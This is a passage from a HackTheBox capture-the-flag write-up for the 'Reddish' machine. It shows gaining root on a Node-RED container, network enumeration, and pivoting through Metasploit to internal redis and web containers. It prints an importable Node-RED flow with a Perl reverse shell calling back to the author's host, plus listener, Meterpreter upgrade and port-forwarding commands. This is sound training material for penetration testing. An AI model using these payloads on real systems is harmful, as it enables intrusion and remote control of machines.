<p>first import the commads then deploy it and click the button , then i recive a shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/reddish<span class="comment"># nc -lvp 9001</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:39270.</span><br><span class="line">&gt; <span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"></span><br><span class="line">&gt; <span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="Callback-Shell"><a href="#Callback-Shell" class="headerlink" title="Callback Shell"></a>Callback Shell</h3><p>In investigating the box, it’s incredibly bare: no python, python3, php, nc, ifconfig, netstat, arp. There is perl though.</p>
<p>I’ll use the perl reverse shell from </p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL3BlbnRlc3Rtb25rZXkubmV0L2NoZWF0LXNoZWV0L3NoZWxscy9yZXZlcnNlLXNoZWxsLWNoZWF0LXNoZWV0">PentestMonkey<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>to get a proper callback shell. The exec node runs a command. In this case, I’ll configure it to take input for the port, which is inserted into the middle of the command:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb48.jpg"></li>
</ul>
<p>looks like:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb49.jpg"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;tab&quot;</span>,<span class="string">&quot;label&quot;</span>:<span class="string">&quot;Reverse_TCP&quot;</span>,<span class="string">&quot;disabled&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;info&quot;</span>:<span class="string">&quot;&quot;</span>&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;6caeb9ad.e39468&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;inject&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;9002&quot;</span>,<span class="string">&quot;topic&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;payload&quot;</span>:<span class="string">&quot;9002&quot;</span>,<span class="string">&quot;payloadType&quot;</span>:<span class="string">&quot;str&quot;</span>,<span class="string">&quot;repeat&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;crontab&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;once&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;onceDelay&quot;</span>:0.1,<span class="string">&quot;x&quot;</span>:150,<span class="string">&quot;y&quot;</span>:160,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;97f946aa.853548&quot;</span>]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;97f946aa.853548&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;command&quot;</span>:<span class="string">&quot;perl -e &#x27;use Socket;<span class="variable">$i</span>=\&quot;10.10.14.9\&quot;;<span class="variable">$p</span>=&quot;</span>,<span class="string">&quot;addpay&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;append&quot;</span>:<span class="string">&quot;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\&quot;tcp\&quot;));if(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;open(STDIN,\&quot;&gt;&amp;S\&quot;);open(STDOUT,\&quot;&gt;&amp;S\&quot;);open(STDERR,\&quot;&gt;&amp;S\&quot;);exec(\&quot;/bin/sh -i\&quot;);&#125;;&#x27;&quot;</span>,<span class="string">&quot;useSpawn&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;timer&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;oldrc&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;perl rev shell&quot;</span>,<span class="string">&quot;x&quot;</span>:350,<span class="string">&quot;y&quot;</span>:160,<span class="string">&quot;wires&quot;</span>:[[<span class="string">&quot;e2dba6a9.bb9fe8&quot;</span>],[<span class="string">&quot;e2dba6a9.bb9fe8&quot;</span>],[]]&#125;,&#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;e2dba6a9.bb9fe8&quot;</span>,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;debug&quot;</span>,<span class="string">&quot;z&quot;</span>:<span class="string">&quot;6fe6b87a.30d988&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;active&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;tosidebar&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;console&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;tostatus&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;complete&quot;</span>:<span class="string">&quot;false&quot;</span>,<span class="string">&quot;x&quot;</span>:570,<span class="string">&quot;y&quot;</span>:160,<span class="string">&quot;wires&quot;</span>:[]&#125;]</span><br></pre></td></tr></table></figure>

<p>first import the commads then deploy it and click the button , then i recive a shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 9002</span></span><br><span class="line">Ncat: Version 7.80 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9002</span><br><span class="line">Ncat: Listening on 0.0.0.0:9002</span><br><span class="line">Ncat: Connection from 10.10.10.94.</span><br><span class="line">Ncat: Connection from 10.10.10.94:46916.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br></pre></td></tr></table></figure>

<h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>Since the box doesn’t have curl or wget or nc, created a file upload flow, that would callback to a given port, and then what it reads to &#x2F;tmp&#x2F;.df&#x2F;upload:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb50.jpg"></li>
</ul>
<p>The string “9003” is not used by the TCP node, just there because needed something, and it was a good visual reminder as to what port the flow expected.</p>
<h2 id="nodered-Container"><a href="#nodered-Container" class="headerlink" title="nodered Container"></a>nodered Container</h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a>Local Enumeration</h3><p>The local box is quite bare. I’m already running as root. As mentioned before, almost none of programs I’d expect on a linux host are present. Also, none of the IP addresses match 10.10.10.94:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ip addr</span></span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00                                                 </span><br><span class="line">    inet 127.0.0.1/8 scope host lo                                                                                 </span><br><span class="line">       valid_lft forever preferred_lft forever                                                                       </span><br><span class="line">7: eth1@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default                              </span><br><span class="line">    <span class="built_in">link</span>/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff                                                                        </span><br><span class="line">    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth1                                                                     </span><br><span class="line">       valid_lft forever preferred_lft forever                                                                                      </span><br><span class="line">9: eth0@if10: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default                                          </span><br><span class="line">    <span class="built_in">link</span>/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff                                                                                      </span><br><span class="line">    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0                                                                                        </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>conclude in a container, and didn’t find much else of interest in it.<br>Since in a container, start tracking what I know about it:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb51.jpg"></li>
</ul>
<h3 id="Network-Enumeration"><a href="#Network-Enumeration" class="headerlink" title="Network Enumeration"></a>Network Enumeration</h3><p>It’s fairly clear I need to move outside this container, and since there’s no obvious path to the host, I’ll look around the environment.</p>
<ul>
<li>Check arp</li>
</ul>
<p>The arp cache shows only the two .1 ips, which are likely the host:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/net/arp</span></span><br><span class="line">IP address       HW <span class="built_in">type</span>     Flags       HW address            Mask     Device</span><br><span class="line">172.19.0.1       0x1         0x2         02:42:bc:00:fb:35     *        eth1</span><br><span class="line">172.18.0.1       0x1         0x2         02:42:de:ac:1d:ce     *        eth0</span><br></pre></td></tr></table></figure>

<ul>
<li>nmap Host</li>
</ul>
<p>uploaded a </p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FuZHJldy1kL3N0YXRpYy1iaW5hcmllcw==">statically compiled nmap<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>to check out the .1s:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.18.0.1</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 10:57 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.18.0.1</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">1880/tcp open  unknown</span><br><span class="line">MAC Address: 02:42:1F:A4:77:C3 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 15.01 seconds</span><br><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.19.0.1</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 10:57 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.19.0.1</span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00013s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">1880/tcp filtered unknown</span><br><span class="line">MAC Address: 02:42:F2:E9:5E:A1 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 14.98 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>Ping Sweep</li>
</ul>
<p>Next start a ping sweep to look for other hosts&#x2F;containers, and find two other hosts worth looking at in the 172.19.0.0&#x2F;24 subnet. Based on my current ifconfig and my assumption about the .1s being the gateway, I can label the output leaving two unknowns:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for i in $(seq 1 254); do (ping -c 1 172.18.0.$i | grep &quot;bytes from&quot; | cut -d&#x27;:&#x27; -f1 | cut -d&#x27; &#x27; -f4 &amp;); done</span></span><br><span class="line">172.18.0.1  &lt;-- host</span><br><span class="line">172.18.0.2  &lt;-- node-red container</span><br><span class="line"><span class="comment"># for i in $(seq 1 254); do (ping -c 1 172.19.0.$i | grep &quot;bytes from&quot; | cut -d&#x27;:&#x27; -f1 | cut -d&#x27; &#x27; -f4 &amp;); done                    </span></span><br><span class="line">172.19.0.2</span><br><span class="line">172.19.0.1  &lt;-- host</span><br><span class="line">172.19.0.3  &lt;-- nodered container</span><br><span class="line">172.19.0.4</span><br></pre></td></tr></table></figure>

<p>got two new hosts to track:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb52.jpg"></li>
</ul>
<h2 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h2><h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>There’s many ways to set up tunnels to allow my pivot here. A few that come to mind are:</p>
<ul>
<li><p>Get a meterpreter session with nodered, and use the portfwd capability to tunnel from my local box into the network (like ssh tunneling).</p>
</li>
<li><p>Copy an ssh client to nodered, and ssh back into my kali box with a reverse tunnel.</p>
</li>
<li><p>Build a listening interface (likely web) with NodeRed, and use that to tunnel traffic.</p>
</li>
<li><p>Using software designed for tunneling.</p>
</li>
</ul>
<h3 id="Getting-Meterpreter"><a href="#Getting-Meterpreter" class="headerlink" title="Getting Meterpreter"></a>Getting Meterpreter</h3><p>Open a handler with payload linux&#x2F;x64&#x2F;shell&#x2F;reverse_tcp, and catch a callback from flow:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (linux/x64/shell/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  9002             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 10.10.14.9</span><br><span class="line">lhost =&gt; 10.10.14.9</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.9:9002 </span><br><span class="line">[*] Sending stage (38 bytes) to 10.10.10.94</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.9:9002 -&gt; 10.10.10.94:47014) at 2020-07-25 12:40:43 -0400</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">/bin/sh: 1: j^H��j!Xu�j: not found</span><br><span class="line">/bin/sh: 1: X�H�/bin/shSH��RWH��<span class="built_in">id</span>: not found</span><br></pre></td></tr></table></figure>

<p>For some reason, the first command run in this new shell can be garbage and fail. After making sure to get that out of the way, I’ll background the session (ctrl-z):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="comment"># ^Z</span></span><br><span class="line">Background session 1? [y/N]  y</span><br></pre></td></tr></table></figure>
<p>Metasploit has a built in upgrade path to Meterpreter using sessions -u:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; sessions -u 1</span><br><span class="line">[*] Executing <span class="string">&#x27;post/multi/manage/shell_to_meterpreter&#x27;</span> on session(s): [1]</span><br><span class="line"></span><br><span class="line">[*] Upgrading session ID: 1</span><br><span class="line">[*] Starting exploit/multi/handler</span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.9:4433 </span><br><span class="line">[*] Sending stage (985320 bytes) to 10.10.10.94</span><br><span class="line">[*] Command stager progress: 100.00% (773/773 bytes)</span><br><span class="line">msf5 exploit(multi/handler) &gt; [*] Meterpreter session 2 opened (10.10.14.9:4433 -&gt; 10.10.10.94:50690) at 2020-07-25 12:41:29 -0400</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; </span><br><span class="line">[*] Stopping exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                   Information                                             Connection</span><br><span class="line">  --  ----  ----                   -----------                                             ----------</span><br><span class="line">  1         shell x64/linux        /bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off #  10.10.14.9:9002 -&gt; 10.10.10.94:47014 (10.10.10.94)</span></span><br><span class="line"><span class="string">  2         meterpreter x86/linux  uid=0, gid=0, euid=0, egid=0 @ 172.18.0.2               10.10.14.9:4433 -&gt; 10.10.10.94:50690 (172.18.0.2)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 exploit(multi/handler) &gt; sessions -i 2</span></span><br><span class="line"><span class="string">[*] Starting interaction with 2...</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="www-redis-Containers"><a href="#www-redis-Containers" class="headerlink" title="www redis Containers"></a>www redis Containers</h2><h3 id="Note-About-IPs"><a href="#Note-About-IPs" class="headerlink" title="Note About IPs"></a>Note About IPs</h3><p>One thing to note - on each reset &#x2F; boot, Docker seems to randomize the IP addresses of the three containers, nodered, www, and redis. They always seem to be .2, .3, and .4, but which is which is something I need to determine each time. For the sake of this post, I’m working with redis as .2, nodered as .3, and www as .4.</p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>Get an nmap scan of these two new hosts:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.19.0.2</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 11:19 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> reddish_composition_redis_1.reddish_composition_internal-network (172.19.0.2)                                                                       </span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  unknown</span><br><span class="line">MAC Address: 02:42:AC:13:00:02 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.49 seconds</span><br><span class="line"><span class="comment"># ./nmap -p- -sT --min-rate 5000 172.19.0.4</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-07-24 11:19 UTC</span><br><span class="line">Unable to find nmap-services!  Resorting to /etc/services</span><br><span class="line">Cannot find nmap-payloads. UDP payloads are disabled.</span><br><span class="line">Nmap scan report <span class="keyword">for</span> reddish_composition_www_1.reddish_composition_internal-network (172.19.0.3)                                                                         </span><br><span class="line">Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed</span><br><span class="line">Host is up (0.00016s latency).</span><br><span class="line">Not shown: 65534 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 02:42:AC:13:00:03 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 2.39 seconds</span><br></pre></td></tr></table></figure>

<p>can see the docker names, reddish_composition_redis_1 and reddish_composition_www_1, and the listening ports which fit for each server, 6379 for redis, and 80 for www.</p>
<h3 id="Web-Site"><a href="#Web-Site" class="headerlink" title="Web Site"></a>Web Site</h3><ul>
<li>Access<br>I’ll use the meterpreter shell to port forward localhost 80 through the session to 172.19.0.3:</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -l 80 -r 172.19.0.3 -p 80</span><br><span class="line">[*] Local TCP relay created: :80 &lt;-&gt; 172.19.0.3:80</span><br></pre></td></tr></table></figure>

<p>Visiting <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMS8=">http://127.0.0.1/<i class="fa fa-external-link-alt"></i></span> gives the page:</p>
<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb53.jpg"></p>
</li>
<li><p>Javascript<br>Much more interesting than the displayed page is the javascript in the source:</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>/&gt;</span><br><span class="line">        &lt;title&gt;Reddish&lt;/title&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;assets/jquery.js&quot;</span> <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">						$(document).ready(<span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">								incrCounter();</span><br><span class="line">						    getData();</span><br><span class="line">						&#125;);</span><br><span class="line"></span><br><span class="line">						<span class="keyword">function</span> <span class="function"><span class="title">getData</span></span>() &#123;</span><br><span class="line">						    $.ajax(&#123;</span><br><span class="line">						        url: <span class="string">&quot;8924d0549008565c554f8128cd11fda4/ajax.php?test=get hits&quot;</span>,</span><br><span class="line">						        cache: <span class="literal">false</span>,</span><br><span class="line">						        dataType: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">						        success: <span class="keyword">function</span> (data) &#123;</span><br><span class="line">											console.log(<span class="string">&quot;Number of hits:&quot;</span>, data)</span><br><span class="line">						        &#125;,</span><br><span class="line">						        error: <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">						        &#125;</span><br><span class="line">						    &#125;);</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						<span class="keyword">function</span> <span class="function"><span class="title">incrCounter</span></span>() &#123;</span><br><span class="line">						    $.ajax(&#123;</span><br><span class="line">						        url: <span class="string">&quot;8924d0549008565c554f8128cd11fda4/ajax.php?test=incr hits&quot;</span>,</span><br><span class="line">						        cache: <span class="literal">false</span>,</span><br><span class="line">						        dataType: <span class="string">&quot;text&quot;</span>,</span><br><span class="line">						        success: <span class="keyword">function</span> (data) &#123;</span><br><span class="line">				              console.log(<span class="string">&quot;HITS incremented:&quot;</span>, data);</span><br><span class="line">						        &#125;,</span><br><span class="line">						        error: <span class="function"><span class="title">function</span></span> () &#123;</span><br><span class="line">						        &#125;</span><br><span class="line">						    &#125;);</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">						/*</span><br><span class="line">							* TODO</span><br><span class="line">							